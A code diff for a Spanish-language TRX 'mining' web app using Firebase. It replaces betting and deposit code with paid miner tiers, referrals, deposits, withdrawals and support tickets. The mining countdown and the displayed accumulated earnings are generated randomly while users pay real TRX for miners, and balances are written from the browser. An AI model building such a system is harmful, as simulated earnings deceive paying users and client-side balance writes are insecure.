+            return Math.random().toString(36).substring(2, 10).toUpperCase();
+        }
+        
+        // Procesar referido
+        function processReferral(referralCode, referredEmail) {
+            // Buscar usuario con el código de referido
+            db.collection('users').where('referralCode', '==', referralCode).get()
+                .then((querySnapshot) => {
+                    if (!querySnapshot.empty) {
+                        const referrerDoc = querySnapshot.docs[0];
+                        const referrerData = referrerDoc.data();
+                        
+                        // Actualizar datos del referidor
+                        const newReferralsCount = (referrerData.referralsCount || 0) + 1;
+                        const newActiveReferrals = (referrerData.activeReferrals || 0) + 1;
+                        
+                        return db.collection('users').doc(referrerDoc.id).update({
+                            referralsCount: newReferralsCount,
+                            activeReferrals: newActiveReferrals,
+                            referrals: firebase.firestore.FieldValue.arrayUnion({
+                                email: referredEmail,
+                                joinedAt: new Date(),
+                                active: true
+                            })
                         });
                     }
+                })
+                .catch((error) => {
+                    console.error('Error processing referral:', error);
                 });
-                
-                showAlert('success', 'Apuesta cancelada', 'Tu apuesta ha sido cancelada y tu saldo ha sido reembolsado.');
-                document.getElementById(`cancel${type.charAt(0).toUpperCase() + type.slice(1)}BetSection`).style.display = 'none';
-            })
-            .catch(error => {
-                console.error('Error al cancelar apuesta:', error);
-                showAlert('error', 'Error', 'No se pudo cancelar la apuesta. Inténtalo de nuevo.');
-            });
         }
-
-        function resetBetState(type) {
-            if (type === 'day') {
-                clearInterval(cancelDayBetTimer);
-                clearTimeout(cancelDayBetTimeout);
-                document.getElementById('cancelDayBetSection').style.display = 'none';
-                currentDayBetId = null;
-            } else {
-                clearInterval(cancelNightBetTimer);
-                clearTimeout(cancelNightBetTimeout);
-                document.getElementById('cancelNightBetSection').style.display = 'none';
-                currentNightBetId = null;
-            }
-        }
-
-        function clearUserBets() {
-            if (!currentUser) return;
+        
+        // Iniciar contador de minería
+        function startMiningCountdown() {
+            // Inicializar con valores por defecto
+            updateCountdown(24, 0, 0);
             
-            Swal.fire({
-                title: '¿Estás seguro?',
-                text: 'Esta acción borrará todas tus apuestas y no se puede deshacer',
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonColor: '#F4B315',
-                cancelButtonColor: '#d63031',
-                confirmButtonText: 'Sí, borrar todas',
-                cancelButtonText: 'Cancelar',
-                background: '#1A141A',
-                color: '#FFFFFF'
-            }).then((result) => {
-                if (result.isConfirmed) {
-                    database.ref('users/' + currentUser.uid).update({
-                        bets: []
-                    })
-                    .then(() => {
-                        showAlert('success', 'Apuestas borradas', 'Todas tus apuestas han sido eliminadas correctamente');
-                    })
-                    .catch(error => {
-                        console.error('Error al borrar apuestas:', error);
-                        showAlert('error', 'Error', 'No se pudieron borrar las apuestas. Inténtalo de nuevo.');
-                    });
+            // Configurar intervalo para actualizar el contador
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                // Simular minería - en una app real, esto se calcularía basado en el tiempo real
+                const hours = Math.floor(Math.random() * 24);
+                const minutes = Math.floor(Math.random() * 60);
+                const seconds = Math.floor(Math.random() * 60);
+                
+                updateCountdown(hours, minutes, seconds);
+                
+                // Simular ganancias acumuladas
+                if (userData) {
+                    const earnings = (userData.miningEarnings || 0) + Math.random() * 0.1;
+                    document.getElementById('accumulated-earnings').textContent = `TRX acumulados: ${earnings.toFixed(4)}`;
+                    
+                    // Actualizar barra de progreso
+                    const progress = (1 - hours/24) * 100;
+                    document.getElementById('mining-progress-bar').style.width = `${progress}%`;
+                }
+            }, 1000);
+        }
+        
+        // Actualizar contador
+        function updateCountdown(hours, minutes, seconds) {
+            document.getElementById('countdown-hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('countdown-minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('countdown-seconds').textContent = seconds.toString().padStart(2, '0');
+        }
+        
+        // Activar minero
+        function activateMiner(minerType) {
+            if (!userData || !currentUser) return;
+            
+            const minerCosts = {
+                free: 0,
+                basic: 10,
+                advanced: 30,
+                pro: 100
+            };
+            
+            const cost = minerCosts[minerType];
+            
+            // Verificar si el usuario tiene suficiente saldo
+            if (userData.balance < cost) {
+                showAlert(dashboardAlert, `Saldo insuficiente. Necesitas ${cost} TRX para activar este minero.`, 'error');
+                return;
+            }
+            
+            // Actualizar datos del usuario
+            const updatedData = {
+                balance: userData.balance - cost,
+                miners: {
+                    ...userData.miners,
+                    [minerType]: {
+                        active: true,
+                        purchased: true
+                    }
+                },
+                activeMiners: [...userData.activeMiners, minerType]
+            };
+            
+            db.collection('users').doc(currentUser.uid).update(updatedData)
+                .then(() => {
+                    showAlert(dashboardAlert, `Minería ${minerType} activada exitosamente`, 'success');
+                })
+                .catch((error) => {
+                    showAlert(dashboardAlert, error.message, 'error');
+                });
+        }
+        
+        // Actualizar botones de mineros
+        function updateMinerButtons() {
+            if (!userData) return;
+            
+            Object.keys(userData.miners || {}).forEach(minerType => {
+                const minerCard = document.getElementById(`miner-${minerType}`);
+                const minerButton = minerCard.querySelector('button');
+                
+                if (userData.miners[minerType].active) {
+                    minerCard.classList.remove('inactive');
+                    minerCard.classList.add('active');
+                    minerButton.disabled = true;
+                    minerButton.textContent = 'Activada';
+                    minerButton.classList.add('btn-success');
+                } else {
+                    minerCard.classList.remove('active');
+                    minerCard.classList.add('inactive');
+                    minerButton.disabled = false;
+                    minerButton.textContent = minerType === 'free' ? 'Activar' : `Activar por ${getMinerCost(minerType)} TRX`;
+                    minerButton.classList.remove('btn-success');
                 }
             });
         }
-
-        function confirmDeposit() {
-            const depositAmount = parseFloat(document.getElementById('depositAmount').value);
-            const transactionNumber = document.getElementById('transactionNumber').value.trim();
-            
-            clearErrors('depositModal');
-            
-            if (!depositAmount || depositAmount <= 0) {
-                showError('depositAmount', 'Por favor ingresa una cantidad válida para depositar');
-                return;
-            }
-            
-            if (!transactionNumber) {
-                showError('transactionNumber', 'Por favor ingresa el número de transacción');
-                return;
-            }
-            
-            const depositRequest = {
-                userId: currentUser.uid,
-                userName: currentUser.displayName || currentUser.email,
-                amount: depositAmount,
-                method: 'cup',
-                transactionNumber: transactionNumber,
-                timestamp: Date.now(),
-                status: 'pending'
+        
+        // Obtener costo del minero
+        function getMinerCost(minerType) {
+            const costs = {
+                free: 0,
+                basic: 10,
+                advanced: 30,
+                pro: 100
             };
             
-            database.ref('admin/deposits').push(depositRequest)
-                .then(() => {
-                    closeModal('depositModal');
-                    
-                    Swal.fire({
-                        title: 'Solicitud de depósito enviada',
-                        html: `
-                            <div style="text-align: left;">
-                                <div class="payment-instructions">
-                                    <p>Tu solicitud de depósito ha sido enviada al administrador.</p>
-                                    <p><strong>Detalles del depósito:</strong></p>
-                                    <p>Cantidad: ${escapeHtml(depositAmount)} CUP</p>
-                                    <p>Número de transacción: ${escapeHtml(transactionNumber)}</p>
-                                    <p>ID de usuario: ${escapeHtml(currentUser.uid)}</p>
-                                    <p>Tu saldo se actualizará en menos de 24 horas</p>
-                                </div>
-                            </div>
-                        `,
-                        icon: 'info',
-                        confirmButtonColor: '#F4B315',
-                        background: '#1A141A',
-                        color: '#FFFFFF'
-                    });
-                    
-                    document.getElementById('depositAmount').value = '';
-                    document.getElementById('transactionNumber').value = '';
-                })
-                .catch(error => {
-                    console.error('Error al enviar solicitud de depósito:', error);
-                    showAlert('error', 'Error', 'No se pudo enviar la solicitud de depósito. Inténtalo de nuevo.');
-                });
+            return costs[minerType];
         }
-
-        function confirmWithdrawal() {
-            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
-            const cardNumber = document.getElementById('cardNumber').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const transferReference = document.getElementById('transferReference').value.trim();
+        
+        // Copiar dirección de depósito
+        function copyDepositAddress() {
+            const addressInput = document.getElementById('deposit-address');
+            addressInput.select();
+            document.execCommand('copy');
             
-            clearErrors('withdrawModal');
+            showAlert(dashboardAlert, 'Dirección copiada al portapapeles', 'success');
+        }
+        
+        // Verificar transacción (solicitar aprobación administrativa)
+        function verifyTransaction() {
+            const txHash = document.getElementById('tx-hash').value;
+            const amount = document.getElementById('deposit-amount').value;
             
-            if (!withdrawAmount || withdrawAmount < 100) {
-                showError('withdrawAmount', 'El monto mínimo de retiro es 100 CUP');
+            if (!txHash) {
+                showAlert(dashboardAlert, 'Por favor ingresa el hash de la transacción', 'error');
                 return;
             }
             
-            if (withdrawAmount > userBalance) {
-                showError('withdrawAmount', 'No tienes suficiente saldo para este retiro');
+            if (!amount || amount < 10) {
+                showAlert(dashboardAlert, 'Por favor ingresa una cantidad válida (mínimo 10 TRX)', 'error');
                 return;
             }
             
-            if (!cardNumber) {
-                showError('cardNumber', 'Por favor ingresa tu número de tarjeta');
-                return;
-            }
+            showLoader(document.getElementById('deposit-loader'));
             
-            if (!phoneNumber) {
-                showError('phoneNumber', 'Por favor ingresa tu número de teléfono');
-                return;
-            }
-            
-            const today = new Date().toDateString();
-            if (lastWithdrawalDate && new Date(lastWithdrawalDate).toDateString() === today) {
-                showAlert('error', 'Límite de retiros', 'Solo puedes realizar un retiro por día. Inténtalo mañana.');
-                return;
-            }
-            
-            const withdrawalRequest = {
+            // Crear solicitud de depósito pendiente
+            db.collection('pendingDeposits').add({
                 userId: currentUser.uid,
-                userName: currentUser.displayName || currentUser.email,
-                amount: withdrawAmount,
-                cardNumber: cardNumber,
-                phoneNumber: phoneNumber,
-                transferReference: transferReference || 'N/A',
-                timestamp: Date.now(),
-                status: 'pending'
-            };
-            
-            const newBalance = userBalance - withdrawAmount;
-            
-            database.ref('admin/withdrawals').push(withdrawalRequest)
-                .then(() => {
-                    return database.ref('users/' + currentUser.uid).update({
-                        balance: newBalance,
-                        lastWithdrawalDate: Date.now()
-                    });
-                })
-                .then(() => {
-                    closeModal('withdrawModal');
-                    showAlert('success', 'Retiro realizado', `Se han retirado ${escapeHtml(withdrawAmount)} CUP de tu cuenta. El proceso de transferencia puede tardar hasta 24 horas.`);
-                    
-                    document.getElementById('withdrawAmount').value = '';
-                    document.getElementById('cardNumber').value = '';
-                    document.getElementById('phoneNumber').value = '';
-                    document.getElementById('transferReference').value = '';
-                })
-                .catch(error => {
-                    console.error('Error al enviar solicitud de retiro:', error);
-                    showAlert('error', 'Error', 'No se pudo completar el retiro. Inténtalo de nuevo.');
-                });
+                userEmail: currentUser.email,
+                amount: parseFloat(amount),
+                txHash: txHash,
+                status: 'pending',
+                timestamp: new Date()
+            })
+            .then(() => {
+                hideLoader(document.getElementById('deposit-loader'));
+                showAlert(dashboardAlert, 'Solicitud de depósito enviada. Un administrador la verificará pronto.', 'success');
+                
+                // Limpiar campos
+                document.getElementById('deposit-amount').value = '';
+                document.getElementById('tx-hash').value = '';
+            })
+            .catch((error) => {
+                hideLoader(document.getElementById('deposit-loader'));
+                showAlert(dashboardAlert, 'Error al enviar la solicitud: ' + error.message, 'error');
+            });
         }
-
+        
+        // Manejar retiro
+        function handleWithdraw() {
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const address = document.getElementById('withdraw-address').value;
+            
+            if (!amount || amount < 10) {
+                showAlert(dashboardAlert, 'El retiro mínimo es de 10 TRX', 'error');
+                return;
+            }
+            
+            if (!address) {
+                showAlert(dashboardAlert, 'Por favor ingresa una dirección de retiro válida', 'error');
+                return;
+            }
+            
+            if (!userData || amount > userData.miningEarnings) {
+                showAlert(dashboardAlert, 'Fondos insuficientes para realizar el retiro', 'error');
+                return;
+            }
+            
+            showLoader(document.getElementById('withdraw-loader'));
+            
+            // Crear solicitud de retiro pendiente
+            db.collection('pendingWithdrawals').add({
+                userId: currentUser.uid,
+                userEmail: currentUser.email,
+                amount: amount,
+                address: address,
+                status: 'pending',
+                timestamp: new Date()
+            })
+            .then(() => {
+                // Actualizar saldo del usuario (restar fondos pendientes de retiro)
+                db.collection('users').doc(currentUser.uid).update({
+                    miningEarnings: firebase.firestore.FieldValue.increment(-amount)
+                })
+                .then(() => {
+                    hideLoader(document.getElementById('withdraw-loader'));
+                    showAlert(dashboardAlert, `Solicitud de retiro de ${amount} TRX enviada. Un administrador la procesará pronto.`, 'success');
+                    
+                    // Limpiar campos
+                    document.getElementById('withdraw-amount').value = '';
+                    document.getElementById('withdraw-address').value = '';
+                });
+            })
+            .catch((error) => {
+                hideLoader(document.getElementById('withdraw-loader'));
+                showAlert(dashboardAlert, error.message, 'error');
+            });
+        }
+        
+        // Copiar enlace de referido
+        function copyReferralLink() {
+            const referralLink = document.getElementById('referral-link-text');
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = referralLink.textContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+            
+            showAlert(dashboardAlert, 'Enlace de referido copiado al portapapeles', 'success');
+        }
+        
+        // Enviar ticket de soporte
+        function sendSupportTicket() {
+            const subject = document.getElementById('support-subject').value;
+            const message = document.getElementById('support-message').value;
+            
+            if (!subject || !message) {
+                showAlert(dashboardAlert, 'Por favor completa todos los campos', 'error');
+                return;
+            }
+            
+            if (!currentUser) return;
+            
+            // Agregar ticket a la base de datos
+            db.collection('supportTickets').add({
+                userId: currentUser.uid,
+                userEmail: currentUser.email,
+                subject: subject,
+                message: message,
+                status: 'open',
+                createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                messages: [{
+                    sender: 'user',
+                    message: message,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                }]
+            })
+            .then(() => {
+                showAlert(dashboardAlert, 'Ticket de soporte enviado con éxito', 'success');
+                
+                // Limpiar campos
+                document.getElementById('support-subject').value = '';
+                document.getElementById('support-message').value = '';
+            })
+            .catch((error) => {
+                showAlert(dashboardAlert, error.message, 'error');
+            });
+        }
+        
+        // Reiniciar minería
+        function resetMining() {
+            if (miningInterval) {
+                clearInterval(miningInterval);
+                miningInterval = null;
+            }
+            
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+        }
+        
+        // Inicializar la aplicación cuando el DOM esté listo
         document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
